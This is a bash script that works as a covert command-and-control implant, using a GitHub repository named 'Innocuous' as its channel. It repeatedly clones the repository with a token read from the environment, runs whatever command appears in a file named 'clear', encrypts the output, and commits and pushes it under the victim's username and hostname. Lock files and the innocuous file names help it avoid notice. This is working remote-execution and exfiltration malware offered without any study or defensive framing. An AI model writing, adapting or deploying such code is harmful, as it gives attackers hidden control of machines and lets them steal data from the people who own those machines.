#!/bin/bash

LOCKFILE="/tmp/tmp6iwot03k.lock"

if [ -e "$LOCKFILE" ]; then
    exit 0
fi

touch "$LOCKFILE"

LAST_COMMAND=""
PAT=$GHPAT
AESK=$AESP

slip=25

mkdir /tmp/tmp6iwot03k/
cd /tmp/tmp6iwot03k/

while true; do

	git clone https://$PAT@github.com/armysick/Innocuous
	cd Innocuous

	slip=$(cat sleep)
	dmc=$(head -n 1 clear)
	if [ "$LAST_COMMAND" != "$dmc" ]; then
		output=$(bash -c "$dmc")
		echo $output | openssl enc -aes-256-cbc -base64 -pass pass:$AESK >> ls
		git add ls
		GIT_AUTHOR_NAME="$(whoami)/$(hostname)" GIT_AUTHOR_EMAIL="new.user@example.com" GIT_COMMITTER_NAME="Committer Name" GIT_COMMITTER_EMAIL="committer@example.com" git commit -m "yup"
		git push
		LAST_COMMAND=$dmc
	fi

	cd ..
	rm -rf Innocuous

	sleep $slip
done
